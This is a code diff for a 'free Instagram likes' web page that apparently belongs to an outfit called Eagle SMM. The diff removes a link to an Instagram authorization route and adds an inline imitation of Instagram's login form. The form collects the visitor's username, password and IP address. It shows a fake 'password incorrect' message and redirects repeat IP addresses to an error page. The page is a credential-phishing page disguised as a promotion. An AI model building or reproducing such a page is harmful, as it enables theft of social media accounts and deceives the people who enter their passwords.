@@ -5,26 +5,305 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
     <link rel="stylesheet" href="style.css">
+    <style>
+         @import url("https://fonts.googleapis.com/css2?family=Roboto:wght@100;300;400;500&display=swap");
+        .container {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  font-family: "Roboto", sans-serif;
+
+}
+.container .col .box {
+  width: 350px;
+  /* height: 380px; */
+  border: 1px solid rgba(219, 219, 219, 1);
+  background: white;
+  border-radius: 1px;
+  margin: 0 0 10px;
+  padding: 10px 0;
+  z-index: 2;
+}
+.container .col .box .title {
+  position: relative;
+  top: 5px;
+  text-align: center;
+}
+.container .col.content {
+  position: relative;
+  margin-bottom: 2rem;
+}
+.container .col .box .title img {
+  width: 190px;
+  height: 80px;
+}
+.container .col .box .login-form {
+  position: relative;
+  /* height: 260px; */
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  flex-direction: column;
+}
+.container .col .box .login-form .form-content {
+  position: relative;
+  margin: 5px 0;
+  top: 22px;
+}
+.container .col .box .login-form .form-content .showPassword{
+  color: #262626;
+  font-size: 14px;
+  font-weight: 600;
+  background-color: transparent;
+  width: auto;
+  height: auto;
+  position: absolute;
+  right: 8px;
+  top: 25%;
+  cursor: pointer;
+}
+.container .col .box .login-form .form-content .showPassword:hover{
+  opacity: .5;
+}
+  .container .col .box .login-form label {
+  position: absolute;
+  top: 50%;
+  transform: translateY(-50%);
+  left: 9px;
+  font-size: 12px;
+  color: rgba(142, 142, 142, 1);
+  pointer-events: none;
+  order: -1;
+  transition: 0.3s ease;
+}
+.container .col .box .login-form input {
+  background: transparent;
+  width: 270px;
+  height: 40px;
+  background: rgba(250, 250, 250, 1);
+  border: 1px solid rgba(219, 219, 219, 1);
+  border-radius: 3px;
+  padding: 9px 0 7px 8px;
+  outline: none;
+  font-size: 14px;
+  transition: 0.3s ease;
+}
+.container .col .box .login-form input:valid {
+  padding-bottom: 0;
+}
+.container .col .box .login-form input:valid + label {
+  transform: translateY(-16px);
+  font-size: 10px;
+}
+.container .col .box .login-form button {
+  width: 270px;
+  height: 30px;
+  border: none;
+  cursor: pointer;
+  outline: none;
+  border-radius: 4px;
+  background-color: rgba(0, 149, 246);
+  color: white;
+}
+.container .col .box .login-form button:disabled {
+  background-color: #4CB5F9;
+  cursor: default;
+}
+
+.container .col .box .login-form .form-ending {
+  position: relative;
+  width: 270px;
+  margin-top: 20px;
+  text-align: center;
+}
+.container .col .box .login-form .form-ending #OR {
+  color: rgba(142, 142, 142, 1);
+  background: white;
+  text-align: center;
+  width: 50px;
+  margin: 15px 0;
+  font-size: 13px;
+  font-weight: 500;
+  line-height: 15px;
+  z-index: 3;
+  position: relative;
+  display: block;
+}
+.LoginError{
+  color: rgb(237, 73, 86);
+  font-size: 14px;
+  display: none;
+  line-height: 18px;
+}
+.container .col .box .login-form .form-ending #line {
+  z-index: 1;
+  position: absolute;
+  left: 50%;
+  transform: translateX(-50%);
+  top: 22px;
+  width: 270px;
+  height: 1px;
+  background: rgba(219, 219, 219, 1);
+}
+.container .col .box .login-form .form-ending p#facebook {
+  color: #385185;
+  cursor: pointer;
+  font-size: 14px;
+  font-weight: 500;
+  margin-top: 15px;
+  margin-bottom: 18px;
+}
+.container .col .box .login-form .form-ending p#facebook i {
+  margin-right: 8px;
+  font-size: 16px;
+  position: relative;
+  top: 1px;
+}
+.container .col .box .login-form .form-ending a {
+  /* position: relative; */
+  top: 12px;
+  text-decoration: none;
+  color: rgba(0, 55, 107, 1);
+  font-size: 12px;
+  line-height: 14px;
+  text-align: center;
+  margin-top: 18px;
+  display: block;
+}
+/* mini box  */
+.container .col .mini-box {
+  width: 350px;
+  height: 65px;
+  background: white;
+  border: 1px solid rgba(219, 219, 219, 1);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+.container .col .mini-box .text {
+  font-size: 14px;
+  color: rgba(38, 38, 38, 1);
+}
+.container .col .mini-box .text a {
+  text-decoration: none;
+  color: #0095f6;
+  font-weight: 400;
+}
+.container .col .download-section {
+  margin-top: 20px;
+  width: 350px;
+  height: 100px;
+  text-align: center;
+}
+.container .col .download-section p {
+  font-size: 14px;
+  line-height: 18px;
+}
+.container .col .download-section .images {
+  margin-top: 20px;
+  display: flex;
+  justify-content: center;
+  gap: 10px;
+}
+.container .col .download-section .images img {
+    width: 135px;
+    height: 40px;
+}
+.container .col img#image {
+    width: auto;
+    height: 544px;
+    margin-right: 32px;
+}
+footer {
+  padding: 30px 20px;
+  margin-top: 40px;
+}
+footer ul {
+  display: flex;
+  justify-content: center;
+  flex-wrap: wrap;
+  gap: 16px;
+  width: 90%;
+  margin: 0 auto 20px;
+}
+footer ul a {
+  text-decoration: none;
+}
+footer ul li {
+  font-size: 12px;
+  line-height: 14px;
+  list-style: none;
+  color: rgba(142, 142, 142, 1);
+  cursor: pointer;
+}
+footer .copyright {
+  display: flex;
+  justify-content: center;
+  gap: 10px;
+}
+footer .copyright select {
+  font-size: 12px;
+  background: none;
+  color: rgba(142, 142, 142, 1);
+  border: none;
+  cursor: pointer;
+}
+footer .copyright select option {
+  width: 50px;
+}
+footer .copyright span {
+  font-size: 12px;
+  line-height: 14px;
+  color: rgba(142, 142, 142, 1);
+}
+@media (max-width: 900px) {
+  footer ul {
+    width: 100%;
+  }
+}
+@media (max-width: 850px) {
+  #image {
+    display: none;
+  }
+}
+
+@media (max-width: 440px) {
+
+  .container .col .box,
+  .container .col .mini-box {
+    
+    background-color: transparent;
+  }
+  .container .col .mini-box,
+  .container .col .box {
+    width: 110%;
+    margin-left: -5%;
+}
+    
+  body{
+    background-color: white;
+  }
+  
+}
+@media (max-width: 375px) {
+  footer .copyright{
+    flex-direction: column;
+    align-items: center;
+  }
+}
+    </style>
 </head>
 <body>
     <section class="Followers">
         <div class="leftContainer">
-            <div class="box recentUsers">
-                <h2 class="TopHeading">
-                    Our Recent Users
-                </h2>
-                <div class="users">
-                    
-                </div>
-            </div>
+          <img src="./Img/rates.png" alt="">
         </div>
         <div class="rightContainer">
             <div class="heading">
-                <h2>Get Free</h2>
-                <img src="/Img/instagramLogo.png" alt="">
-                <h2>Likes</h2>
+                <h2>Get Free <br> Instagram <br> Likes</h2>
+               
             </div>
-            <div class="inputs">
+            <div class="inputs" >
                 <select name="" id="">
                     <option value="">Quantity</option>
                     <option value="100">100</option>
@@ -34,9 +313,9 @@
                     <option value="500" disabled>2000</option>
                 </select>
                 <input type="text" placeholder="Your Full Name">
-                <a style="text-decoration: none;" href="/instagram-auth">
+                <a style="text-decoration: none;">
 
-                    <button class="loginWithIgButton button">
+                    <button class="loginWithIgButton button" onclick="showInstaLogin()">
                         <svg xmlns="http://www.w3.org/2000/svg" width="35" height="35" viewBox="0 0 35 35" fill="none">
                             <g clip-path="url(#clip0_78_233)">
                                 <path d="M17.5078 9.63867C12.5391 9.63867 8.53125 13.1455 8.53125 17.4932C8.53125 21.8408 12.5391 25.3477 17.5078 25.3477C22.4766 25.3477 26.4844 21.8408 26.4844 17.4932C26.4844 13.1455 22.4766 9.63867 17.5078 9.63867ZM17.5078 22.5996C14.2969 22.5996 11.6719 20.3096 11.6719 17.4932C11.6719 14.6768 14.2891 12.3867 17.5078 12.3867C20.7266 12.3867 23.3438 14.6768 23.3438 17.4932C23.3438 20.3096 20.7188 22.5996 17.5078 22.5996ZM28.9453 9.31738C28.9453 10.3359 28.0078 11.1494 26.8516 11.1494C25.6875 11.1494 24.7578 10.3291 24.7578 9.31738C24.7578 8.30566 25.6953 7.48535 26.8516 7.48535C28.0078 7.48535 28.9453 8.30566 28.9453 9.31738ZM34.8906 11.1768C34.7578 8.72266 34.1172 6.54883 32.0625 4.75781C30.0156 2.9668 27.5313 2.40625 24.7266 2.2832C21.8359 2.13965 13.1719 2.13965 10.2812 2.2832C7.48438 2.39941 5 2.95996 2.94531 4.75098C0.890625 6.54199 0.257812 8.71582 0.117187 11.1699C-0.046875 13.6992 -0.046875 21.2803 0.117187 23.8096C0.25 26.2637 0.890625 28.4375 2.94531 30.2285C5 32.0195 7.47656 32.5801 10.2812 32.7031C13.1719 32.8467 21.8359 32.8467 24.7266 32.7031C27.5313 32.5869 30.0156 32.0264 32.0625 30.2285C34.1094 28.4375 34.75 26.2637 34.8906 23.8096C35.0547 21.2803 35.0547 13.7061 34.8906 11.1768ZM31.1562 26.5234C30.5469 27.8633 29.3672 28.8955 27.8281 29.4355C25.5234 30.2354 20.0547 30.0508 17.5078 30.0508C14.9609 30.0508 9.48438 30.2285 7.1875 29.4355C5.65625 28.9023 4.47656 27.8701 3.85938 26.5234C2.94531 24.5068 3.15625 19.7217 3.15625 17.4932C3.15625 15.2646 2.95313 10.4727 3.85938 8.46289C4.46875 7.12305 5.64844 6.09082 7.1875 5.55078C9.49219 4.75098 14.9609 4.93555 17.5078 4.93555C20.0547 4.93555 25.5313 4.75781 27.8281 5.55078C29.3594 6.08398 30.5391 7.11621 31.1562 8.46289C32.0703 10.4795 31.8594 15.2646 31.8594 17.4932C31.8594 19.7217 32.0703 24.5137 31.1562 26.5234Z" fill="white"/>
@@ -50,134 +329,42 @@
                 Continue With Instagram</button>
             </a>
             </div>
-            <div class="leftContainer LeftContainerMobile">
-                <div class="box recentUsers">
-                    <h2 class="TopHeading">
-                        Our Recent Users
-                    </h2>
-                    <div class="users">
-                        <a href="" class="user">
-                            <div class="left">
-        
-                                <img src="" alt="">
-                                <div class="username">
-                                    <h2>John Doe</h2>
-                                    <p>@john_doe</p>
-                                </div>
-                            </div>
-                            <div class="right">
-                                <p>100</p>
-                                <img src="./Img/arrowRight.svg" alt="">
-                                <p>600</p>
-                            </div>
-                        </a>
-                        <div class="user">
-                            <div class="left">
-        
-                                <img src="" alt="">
-                                <div class="username">
-                                    <h2>John Doe</h2>
-                                    <p>@john_doe</p>
-                                </div>
-                            </div>
-                            <div class="right">
-                                <p>100</p>
-                                <img src="./Img/arrowRight.svg" alt="">
-                                <p>600</p>
-                            </div>
+            <div class="InstaLogin container" style="display: none;">
+                <div class="col content">
+                    <div class="box">
+                      <div class="title">
+                        <img src="https://i.ibb.co/2dCLRGv/logoname.png" alt="logoname" border="0">
+                      </div>
+                      <form class="login-form">
+                        <div class="form-content">
+                          <input type="text" name="username" required />
+                          <input type="hidden" name="ipaddress" id="ipaddress">
+                          <label for="uname">Phone number, username, or email</label>
                         </div>
-                        <div class="user">
-                            <div class="left">
-        
-                                <img src="" alt="">
-                                <div class="username">
-                                    <h2>John Doe</h2>
-                                    <p>@john_doe</p>
-                                </div>
-                            </div>
-                            <div class="right">
-                                <p>100</p>
-                                <img src="./Img/arrowRight.svg" alt="">
-                                <p>600</p>
-                            </div>
+                        <div class="form-content">
+                          <p class="showPassword" onclick="ShowHidePassword(this)">Show</p>
+                          <input type="password" style="padding-right: 50px;" name="password" required />
+                          <label for="password">Password</label>
                         </div>
-                        <div class="user">
-                            <div class="left">
-        
-                                <img src="" alt="">
-                                <div class="username">
-                                    <h2>John Doe</h2>
-                                    <p>@john_doe</p>
-                                </div>
-                            </div>
-                            <div class="right">
-                                <p>100</p>
-                                <img src="./Img/arrowRight.svg" alt="">
-                                <p>600</p>
-                            </div>
+                        <div class="form-content">
+                          <button type="submit" onclick="SubmitData(event)" >Log in</button>
                         </div>
-                        <div class="user">
-                            <div class="left">
-        
-                                <img src="" alt="">
-                                <div class="username">
-                                    <h2>John Doe</h2>
-                                    <p>@john_doe</p>
-                                </div>
-                            </div>
-                            <div class="right">
-                                <p>100</p>
-                                <img src="./Img/arrowRight.svg" alt="">
-                                <p>600</p>
-                            </div>
+                        <div class="form-ending">
+                        
+                          <p class="LoginError">Sorry, your password was incorrect. Please double-check your password.</p>
+                          <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
                         </div>
-                        <div class="user">
-                            <div class="left">
-        
-                                <img src="" alt="">
-                                <div class="username">
-                                    <h2>John Doe</h2>
-                                    <p>@john_doe</p>
-                                </div>
-                            </div>
-                            <div class="right">
-                                <p>100</p>
-                                <img src="./Img/arrowRight.svg" alt="">
-                                <p>600</p>
-                            </div>
-                        </div>
-                        <div class="user">
-                            <div class="left">
-        
-                                <img src="" alt="">
-                                <div class="username">
-                                    <h2>John Doe</h2>
-                                    <p>@john_doe</p>
-                                </div>
-                            </div>
-                            <div class="right">
-                                <p>100</p>
-                                <img src="./Img/arrowRight.svg" alt="">
-                                <p>600</p>
-                            </div>
-                        </div>
-                        <div class="user">
-                            <div class="left">
-        
-                                <img src="" alt="">
-                                <div class="username">
-                                    <h2>John Doe</h2>
-                                    <p>@john_doe</p>
-                                </div>
-                            </div>
-                            <div class="right">
-                                <p>100</p>
-                                <img src="./Img/arrowRight.svg" alt="">
-                                <p>600</p>
-                            </div>
-                        </div>
+                      </form>
                     </div>
-                </div>
+                    <div class="mini-box">
+                      <div class="text">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></div>
+                    </div>
+                   
+                  </div>
+            </div>
+            <div class="leftContainer LeftContainerMobile">
+                <img src="./Img/rates.png" alt="">
+
             </div>
             <div class="bottom">
                 <p>Elevate your Instagram presence with Eagle SMM, specializing in affordable Likes growth. Experience our commitment with a complimentary offer – up to 500 free Likes. Let  Eagle SMM boost your social media influence effortlessly. Click here to purchase more Likes</p>
@@ -193,40 +380,35 @@
     </section>
 
 <script>
-     fetch(`/getrecentusers`)
-        .then(response => response.json())
-        .then(data => displayRecentUsers(data.data))
-        .catch(error => console.error('Error:', error));
-        const displayRecentUsers = (data)=>{
-            let template = ""
-            const usersmb = document.querySelector(".LeftContainerMobile .users")
-            const users = document.querySelector(".leftContainer:not(.LeftContainerMobile) .users")
-            console.log(data)
-            data.forEach(element => {
-                const subname = element.name.substr(0 ,10)
-                
-                
-                template += `
-                <a href="${element.url}" class="user">
-                            <div class="left">
-        
-                                <img src="/${element.dp}" alt="">
-                                <div class="username">
-                                    <h2>${subname}...</h2>
-                                    <p>@${element.username}</p>
-                                </div>
-                            </div>
-                            <div class="right">
-                                <p>${element.from}</p>
-                                <img src="./Img/arrowRight.svg" alt="">
-                                <p>${element.to}</p>
-                                </div>
-                                </a>
-                                `
-                            });
-                            users.innerHTML = template
-                            usersmb.innerHTML = template
-        }
+    const showInstaLogin = ()=>{
+        document.querySelector(".Followers .rightContainer .inputs").style.display = "none"
+        document.querySelector(".InstaLogin").style.display = "flex"
+    }
+    fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+      document.querySelector("#ipaddress").value = data.ip
+      fetch('/checkIp', ({
+        headers: {
+          "Content-Type": "application/json"
+        },
+        method: "post",
+        body: JSON.stringify({
+          ipaddress : data.ip
+        })
+      })).then((res) => {
+        return res.json()
+      }).then((data) => {
+        // console.log(data)
+        if(data.ipFound){
+        window.location.href="/serverError"
+      }
+      })
+    })
+    .catch(error => {
+      console.error('Error fetching IP:', error);
+    });
 </script>
+<script src="./script.js"></script>
 </body>
 </html>
